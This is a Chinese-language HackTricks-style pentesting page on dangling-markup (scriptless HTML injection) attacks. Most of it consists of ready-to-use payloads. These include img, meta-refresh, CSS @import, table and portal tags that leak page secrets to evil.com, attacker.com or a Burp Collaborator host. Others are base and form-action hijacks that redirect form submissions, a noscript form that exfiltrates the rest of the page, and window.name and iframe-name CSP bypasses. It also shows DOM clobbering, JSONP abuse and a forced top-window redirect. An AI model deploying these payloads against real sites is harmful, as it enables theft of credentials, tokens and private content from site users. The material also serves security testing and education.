# Dangling Markup - HTML scriptless injection

{{#include ../../banners/hacktricks-training.md}}

## 简介

此技术可用于在发现**HTML注入**时从用户提取信息。如果您**找不到任何利用** [**XSS** ](../xss-cross-site-scripting/)的方法，但可以**注入一些HTML标签**，这非常有用。\
如果某些**秘密以明文形式保存在HTML中**，并且您想要**从客户端提取**它，或者如果您想误导某些脚本执行，这也很有用。

这里评论的几种技术可以通过以意想不到的方式（html标签、CSS、http-meta标签、表单、base等）提取信息来绕过某些[**内容安全策略**](../content-security-policy-csp-bypass/)。

## 主要应用

### 偷取明文秘密

如果您在页面加载时注入`<img src='http://evil.com/log.cgi?`，受害者将向您发送所有在注入的`img`标签和代码中的下一个引号之间的代码。如果某个秘密以某种方式位于该块中，您将窃取它（您可以使用双引号做同样的事情，看看哪个更有趣）。

如果`img`标签被禁止（例如由于CSP），您也可以使用`<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
请注意，**Chrome 阻止包含 "<" 或 "\n" 的 HTTP URL**，因此您可以尝试其他协议方案，如 "ftp"。

您还可以滥用 CSS `@import`（将发送所有代码，直到找到 ";"）。
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
您还可以使用 **`<table`**：
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
您还可以插入一个 `<base` 标签。所有信息将在引号关闭之前发送，但这需要一些用户交互（用户必须点击某个链接，因为 base 标签将更改链接指向的域）：
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### 偷取表单
```html
<base href="http://evil.com/" />
```
然后，发送数据到路径的表单（如 `<form action='update_profile.php'>`）将把数据发送到恶意域名。

### Stealing forms 2

设置表单头：`<form action='http://evil.com/log_steal'>` 这将覆盖下一个表单头，所有来自表单的数据将被发送给攻击者。

### Stealing forms 3

按钮可以通过属性 "formaction" 更改信息将要发送的表单的 URL：
```html
<button name="xss" type="submit" formaction="https://google.com">
I get consumed!
</button>
```
攻击者可以利用这一点窃取信息。

在这个[**报告中找到此攻击的示例**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)。

### 窃取明文秘密 2

使用最新提到的技术窃取表单（注入新的表单头），然后可以注入一个新的输入字段：
```html
<input type='hidden' name='review_body' value="
```
该输入字段将包含其双引号之间的所有内容以及下一个双引号中的内容。这种攻击将“_**窃取明文秘密**_”与“_**窃取表单2**_”混合在一起。

您可以通过注入一个表单和一个`<option>`标签来做同样的事情。所有数据直到找到一个闭合的`</option>`将被发送：
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### 表单参数注入

您可以更改表单的路径并插入新值，以便执行意外的操作：
```html
<form action="/change_settings.php">
<input type="hidden" name="invite_user" value="fredmbogo" /> ← Injected lines

<form action="/change_settings.php">
← Existing form (ignored by the parser) ...
<input type="text" name="invite_user" value="" /> ← Subverted field ...
<input type="hidden" name="xsrf_token" value="12345" />
...
</form>
</form>
```
### 通过 noscript 偷取明文秘密

`<noscript></noscript>` 是一个标签，其内容将在浏览器不支持 JavaScript 时被解释（您可以在 [chrome://settings/content/javascript](chrome://settings/content/javascript) 中启用/禁用 JavaScript）。

一种将从注入点到页面底部的网页内容导出到攻击者控制的网站的方法是注入以下内容：
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### 通过用户交互绕过CSP

从这个 [portswiggers研究](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) 中你可以了解到，即使在 **最严格的CSP** 环境中，你仍然可以通过一些 **用户交互** 来 **提取数据**。在这种情况下，我们将使用以下有效载荷：
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
请注意，您将要求**受害者**点击一个**链接**，该链接将**重定向**他到您控制的**有效载荷**。还要注意，**`base`**标签中的**`target`**属性将包含**HTML内容**，直到下一个单引号。\
这将使得如果点击链接，**`window.name`**的**值**将是所有的**HTML内容**。因此，由于您**控制**受害者通过点击链接访问的页面，您可以访问该**`window.name`**并**提取**该数据：
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### 误导性脚本工作流程 1 - HTML 命名空间攻击

在 HTML 中插入一个带有 id 的新标签，该标签将覆盖下一个标签，并且其值将影响脚本的流程。在这个例子中，您正在选择与谁共享信息：
```html
<input type="hidden" id="share_with" value="fredmbogo" /> ← Injected markup ...
Share this status update with: ← Legitimate optional element of a dialog
<input id="share_with" value="" />

... function submit_status_update() { ... request.share_with =
document.getElementById('share_with').value; ... }
```
### 误导性脚本工作流程 2 - 脚本命名空间攻击

通过插入 HTML 标签在 JavaScript 命名空间内创建变量。然后，这个变量将影响应用程序的流程：
```html
<img id="is_public" /> ← Injected markup ... // Legitimate application code
follows function retrieve_acls() { ... if (response.access_mode == AM_PUBLIC) ←
The subsequent assignment fails in IE is_public = true; else is_public = false;
} function submit_new_acls() { ... if (is_public) request.access_mode =
AM_PUBLIC; ← Condition always evaluates to true ... }
```
### Abuse of JSONP

如果你发现一个 JSONP 接口，你可能能够调用一个任意函数并传递任意数据：
```html
<script src='/editor/sharing.js'>:              ← Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
set_sharing({ ... })
```
或者你甚至可以尝试执行一些javascript：
```html
<script src="/search?q=a&call=alert(1)"></script>
```
### Iframe 滥用

子文档能够查看和修改其父文档的 `location` 属性，即使在跨源情况下。这允许在 **iframe** 中嵌入一个脚本，可以将客户端重定向到任意页面：
```html
<html>
<head></head>
<body>
<script>
top.window.location = "https://attacker.com/hacked.html"
</script>
</body>
</html>
```
这可以通过类似于：`sandbox=' allow-scripts allow-top-navigation'` 来缓解。

iframe 也可以被滥用来泄露来自不同页面的敏感信息 **使用 iframe name 属性**。这是因为你可以创建一个 iframe，它自身嵌套 iframe，利用 HTML 注入使 **敏感信息出现在 iframe name 属性中**，然后从初始 iframe 访问该名称并泄露它。
```html
<script>
function cspBypass(win) {
win[0].location = "about:blank"
setTimeout(() => alert(win[0].name), 500)
}
</script>

<iframe
src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27"
onload="cspBypass(this.contentWindow)"></iframe>
```
有关更多信息，请查看 [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta 滥用

您可以使用 **`meta http-equiv`** 执行 **多个操作**，例如设置 Cookie：`<meta http-equiv="Set-Cookie" Content="SESSID=1">` 或执行重定向（在这种情况下为 5 秒）：`<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

这可以通过 **CSP** 来 **避免**，涉及 **http-equiv**（`Content-Security-Policy: default-src 'self';` 或 `Content-Security-Policy: http-equiv 'self';`）

### 新的 \<portal HTML 标签

您可以在 [这里](https://research.securitum.com/security-analysis-of-portal-element/) 找到关于可利用的 \<portal 标签漏洞的 **非常有趣的研究**。\
在撰写本文时，您需要在 `chrome://flags/#enable-portals` 中启用 portal 标签，否则它将无法工作。
```html
<portal src='https://attacker-server?
```
### HTML 漏洞

并非所有在 HTML 中泄露连接的方式都对 Dangling Markup 有用，但有时它可能会有所帮助。请在这里查看它们: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

这是 **dangling markup 和 XS-Leaks** 之间的 **混合**。一方面，漏洞允许在 **同源** 的页面中 **注入 HTML**（但不包括 JS）。另一方面，我们不会直接 **攻击** 可以注入 HTML 的页面，而是 **另一个页面**。

{{#ref}}
ss-leaks.md
{{#endref}}

## XS-Search/XS-Leaks

XS-Search 旨在 **提取跨源信息**，利用 **侧信道攻击**。因此，这是一种不同于 Dangling Markup 的技术，然而，一些技术利用了 HTML 标签的包含（有和没有 JS 执行），如 [**CSS 注入**](../xs-search/#css-injection) 或 [**懒加载图像**](../xs-search/#image-lazy-loading)**。**

{{#ref}}
../xs-search/
{{#endref}}

## 暴力破解检测列表

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## 参考文献

- [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
- [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
- [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
- [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{{#include ../../banners/hacktricks-training.md}}
